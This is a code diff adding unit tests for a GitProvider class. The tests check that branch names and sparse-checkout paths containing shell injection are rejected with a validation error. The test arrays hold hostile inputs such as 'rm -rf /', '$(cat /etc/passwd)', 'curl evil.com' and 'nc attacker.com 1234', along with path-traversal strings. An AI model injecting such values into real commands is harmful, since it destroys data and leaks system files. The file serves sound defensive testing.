@@ -193,16 +193,119 @@ describe('GitProvider', () => {
       }
     });
 
-    test('should block path traversal in branch names', async () => {
+    test('should block command injection in branch names (constructor)', () => {
+      const maliciousBranches = [
+        'main"; rm -rf /',
+        'main`whoami`',
+        'main$(cat /etc/passwd)',
+        'main && curl evil.com',
+        'main | nc attacker.com 1234',
+        'main; echo hacked',
+        "main' && rm -rf /",
+      ];
+
+      for (const branch of maliciousBranches) {
+        expect(() => {
+          new GitProvider({
+            type: 'git',
+            repoUrl: 'https://github.com/user/repo.git',
+            branch,
+          });
+        }).toThrow(ValidationError);
+      }
+    });
+
+    test('should block command injection in branch names (checkout)', async () => {
       const provider = new GitProvider({
         type: 'git',
         repoUrl: 'https://github.com/user/repo.git',
         branch: 'main',
       });
 
-      // Branch names with path traversal should fail at git level
-      // This is tested via integration tests with real git
-      expect(true).toBe(true);
+      const maliciousBranches = [
+        'develop"; rm -rf /',
+        'feature`whoami`',
+        'fix$(curl evil.com)',
+        'test && cat /etc/passwd',
+      ];
+
+      for (const branch of maliciousBranches) {
+        await expect(provider.checkout(branch)).rejects.toThrow(ValidationError);
+      }
+    });
+
+    test('should block invalid git ref formats', () => {
+      const invalidBranches = [
+        '.hidden-start',      // starts with dot
+        'ends-with-dot.',     // ends with dot
+        'has..double',        // double dots
+        'has//double',        // double slashes
+        'ends.lock',          // ends with .lock
+      ];
+
+      for (const branch of invalidBranches) {
+        expect(() => {
+          new GitProvider({
+            type: 'git',
+            repoUrl: 'https://github.com/user/repo.git',
+            branch,
+          });
+        }).toThrow(ValidationError);
+      }
+    });
+
+    test('should block command injection in sparse checkout paths', () => {
+      const maliciousPaths = [
+        ['src && rm -rf /'],
+        ['docs', 'tests; curl evil.com'],
+        ['lib`whoami`'],
+        ['/etc/passwd'],      // absolute path
+        ['../../../etc'],     // path traversal
+      ];
+
+      for (const sparseCheckout of maliciousPaths) {
+        expect(() => {
+          new GitProvider({
+            type: 'git',
+            repoUrl: 'https://github.com/user/repo.git',
+            branch: 'main',
+            sparseCheckout,
+          });
+        }).toThrow(ValidationError);
+      }
+    });
+
+    test('should accept valid branch names', () => {
+      const validBranches = [
+        'main',
+        'develop',
+        'feature/new-feature',
+        'bugfix/issue-123',
+        'release-1.0.0',
+        'hotfix_urgent',
+        'test.branch',
+      ];
+
+      for (const branch of validBranches) {
+        expect(() => {
+          new GitProvider({
+            type: 'git',
+            repoUrl: 'https://github.com/user/repo.git',
+            branch,
+          });
+        }).not.toThrow();
+      }
+    });
+
+    test('should accept valid sparse checkout paths', () => {
+      expect(() => {
+        new GitProvider({
+          type: 'git',
+          repoUrl: 'https://github.com/user/repo.git',
+          branch: 'main',
+          sparseCheckout: ['src', 'docs', 'tests', 'lib/utils'],
+        });
+      }).not.toThrow();
     });
   });
 });
